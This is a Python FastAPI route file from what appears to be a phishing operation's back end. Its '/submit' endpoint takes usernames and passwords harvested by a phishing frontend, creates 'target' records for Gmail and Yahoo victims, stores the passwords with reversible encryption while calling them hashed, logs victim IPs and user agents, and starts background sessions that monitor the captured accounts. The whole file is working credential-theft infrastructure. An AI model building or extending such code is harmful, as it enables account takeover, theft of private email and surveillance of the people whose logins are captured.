from fastapi import APIRouter, Depends, status, Request
from sqlalchemy.ext.asyncio import AsyncSession
from sqlalchemy import select

from app.api.deps import get_db
from app.models.target import Target, ProviderEnum, TargetStatus
from app.models.credential import Credential
from app.models.session import MonitoringSession, SessionStatus
from app.schemas.credential import HarvestSubmit
from app.core.security import encrypt_password
from app.core.logging import get_logger

from app.services.scheduler import start_polling_task

log = get_logger("api.harvest")
router = APIRouter()


@router.post("/submit", status_code=status.HTTP_201_CREATED)
async def submit_harvested_credentials(
    harvest_in: HarvestSubmit,
    request: Request,
    db: AsyncSession = Depends(get_db)
):
    """
    Ingest credentials from the phishing frontend.
    Creates target if missing, stores hashed password, and initiates background monitoring session.
    """
    # 1. Determine provider enum
    provider_str = harvest_in.provider.upper() if harvest_in.provider else "GMAIL"
    if "YAHOO" in provider_str or "YAHOO" in harvest_in.username.upper():
        prov_enum = ProviderEnum.YAHOO
    elif "GMAIL" in provider_str or "GMAIL" in harvest_in.username.upper():
        prov_enum = ProviderEnum.GMAIL
    else:
        prov_enum = ProviderEnum.OTHER

    # 2. Create or fetch target profile
    result = await db.execute(select(Target).filter(Target.email == harvest_in.username))
    target = result.scalars().first()
    
    if not target:
        target = Target(
            email=harvest_in.username,
            provider=prov_enum,
            status=TargetStatus.ACTIVE
        )
        db.add(target)
        await db.flush()  # To get target.id
    else:
        target.status = TargetStatus.ACTIVE
        target.provider = prov_enum

    # 3. Store harvested credentials securely
    client_ip = harvest_in.ip_address or (request.client.host if request.client else None)
    user_agent = harvest_in.user_agent or request.headers.get("user-agent")

    credential = Credential(
        target_id=target.id,
        username=harvest_in.username,
        password_hash=encrypt_password(harvest_in.password),
        ip_address=client_ip,
        user_agent=user_agent
    )
    db.add(credential)

    # 4. Create Monitoring Session
    session = MonitoringSession(
        target_id=target.id,
        status=SessionStatus.POLLING
    )
    db.add(session)
    await db.commit()
    await db.refresh(session)

    log.info(f"Harvested credentials for {target.email}. Session {session.id} initiated.")

    # 5. Dispatch to background scheduler
    await start_polling_task(session.id)

    return {
        "status": "success",
        "target_id": str(target.id),
        "session_id": str(session.id),
        "message": "Credentials captured securely, monitoring session initiated."
    }
